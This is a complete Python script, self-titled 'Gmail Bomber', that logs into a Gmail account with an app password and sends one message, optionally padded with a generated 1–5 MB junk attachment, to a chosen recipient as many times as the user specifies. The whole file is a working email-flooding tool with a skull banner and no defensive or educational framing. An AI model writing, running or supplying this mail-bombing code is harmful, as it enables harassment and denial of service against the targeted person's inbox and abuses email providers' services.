#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import getpass
import time
import os
import mimetypes
import colorama

colorama.init()

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

skull_lines = [
    r"         _.--''''''''--._         ",
    r"       .'                '.       ",
    r"      /                    \      ",
    r"     |                      |     ",
    r"     |   ___          ___   |     ",
    r"     |  /   \        /   \  |     ",
    f"     | |  {GREEN}O{RED}  |      |  {GREEN}O{RED}  | |     ", 
    r"      \ \___/        \___/ /      ",
    r"       \                  /       ",
    r"        \      .---.     /        ",
    r"         \     \___/    /         ",
    r"          \            /          ",
    r"           |==========|           ",
    r"           | || || || |           ",
    r"            `--------`            "
]


print(f"\n{RED}", end="")
for i, line in enumerate(skull_lines):
    if i == 1:
        print(f"{line}   {RESET}Gmail Bomber By Zawar Baig.{RED}")
    else:
        print(line)

print(f"\n{GREEN}--- Gmail Bombing Tool ---{RESET}")


print(f"\n{YELLOW}--- 1. Sending Option ---{RESET}")
print(f"{GREEN}[0] Typed Message Only {RESET}")
print(f"{GREEN}[1] Load 1MB Attachment{RESET}")
print(f"{GREEN}[2] Load 2MB Attachment{RESET}")
print(f"{GREEN}[3] Load 3MB Attachment{RESET}")
print(f"{GREEN}[4] Load 4MB Attachment{RESET}")
print(f"{GREEN}[5] Load 5MB Attachment{RESET}")

payload_choice = input(f"{GREEN}Enter your choice (0-5) >> {RESET}")

file_path = None
if payload_choice in ['1', '2', '3', '4', '5']:
    size_mb = int(payload_choice)
    file_path = "Notes.txt"
    print(f"{YELLOW}[*] Generating {size_mb}MB payload file...{RESET}")
    with open(file_path, 'w') as f:
        f.write('A' * size_mb * 1024 * 1024)
    print(f"{GREEN}[+] Payload generated: {file_path}{RESET}")
elif payload_choice != '0':
    print(f"{RED}[!] Invalid choice, defaulting to typed text only.{RESET}")


print(f"\n{YELLOW}--- 2. Login Credentials ---{RESET}")
sender_email = input(f"{GREEN}Enter your Gmail address >> {RESET}")
app_password = getpass.getpass(f"{GREEN}Enter your 16-character App Password (hidden) >> {RESET}")


print(f"\n{YELLOW}--- 3. Message Details ---{RESET}")
recipient = input(f"{GREEN}Enter the recipient email >> {RESET}")
subject = input(f"{GREEN}Enter the message subject>> {RESET}")
body = input(f"{GREEN}Enter the message text >> {RESET}")

print(f"\n{YELLOW}--- 4. Sending Parameters ---{RESET}")
while True:
    try:
        count = int(input(f"{GREEN}How many times do you want to send this message? >> {RESET}"))
        if count > 0:
            break
        else:
            print(f"{RED}Please enter a number greater than 0.{RESET}")
    except ValueError:
        print(f"{RED}Invalid input. Please enter a whole number.{RESET}")

while True:
    try:
        delay = float(input(f"{GREEN}Enter time delay between emails >> {RESET}"))
        if delay >= 0:
            break
        else:
            print(f"{RED}Please enter a positive number or 0.{RESET}")
    except ValueError:
        print(f"{RED}Invalid input. Please enter a number.{RESET}")


print(f"\n{YELLOW}--- 5. Execution ---{RESET}")
print(RESET, end="")

msg = EmailMessage()
msg.set_content(body)
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = recipient


if file_path and os.path.isfile(file_path):
    ctype, encoding = mimetypes.guess_type(file_path)
    if ctype is None or encoding is not None:
        ctype = 'application/octet-stream'
    maintype, subtype = ctype.split('/', 1)
    
    try:
        with open(file_path, 'rb') as fp:
            msg.add_attachment(fp.read(), maintype=maintype, subtype=subtype, filename=os.path.basename(file_path))
        print(f"{GREEN}[+] Attachment loaded successfully!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Failed to load attachment: {e}{RESET}")


try:
    print(f"\n{YELLOW}Connecting to Gmail server...{RESET}")
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls() 
        server.login(sender_email, app_password)
        print(f"{GREEN}Login successful! Starting delivery...\n{RESET}")
        
        for i in range(count):
            server.send_message(msg)
            print(f"{GREEN}[{i + 1}/{count}] Message delivered successfully!{RESET}")
            
            if count > 1 and i < count - 1:
                time.sleep(delay)
                
    print(f"\n{GREEN}Task Complete! All messages sent.{RESET}")

except smtplib.SMTPAuthenticationError:
    print(f"\n{RED}[!] Error: Login failed. Please check your App Password and try again.{RESET}")
except Exception as e:
    print(f"\n{RED}[!] An error occurred: {e}{RESET}")


if file_path and os.path.exists(file_path):
    print(f"\n{YELLOW}--- 6. Cleanup ---{RESET}")
    try:
        os.remove(file_path)
        print(f"{GREEN}[+] Successfully deleted temporary payload file: {file_path}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Failed to delete payload file. You may need to remove '{file_path}' manually. Error: {e}{RESET}")
